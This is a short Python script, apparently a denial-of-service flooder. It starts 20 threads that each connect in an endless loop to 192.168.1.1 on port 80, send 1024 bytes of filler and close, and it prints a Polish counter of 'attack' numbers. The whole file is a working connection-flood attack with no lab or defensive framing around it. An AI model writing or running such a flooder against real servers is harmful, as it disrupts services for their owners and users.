import socket
import threading

num = 1
def start_client():
    server_ip = '192.168.1.1'
    server_port = 80
    global num

    while(True):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))
        client_socket.sendall(b"X"*1024)
        client_socket.close()
        print(f"Numer ataku w ramach jednego wywołania start_client: {num}")
        num=num+1

if __name__ == "__main__":

    for i in range(20):
        thread = threading.Thread(target=start_client)
        thread.start()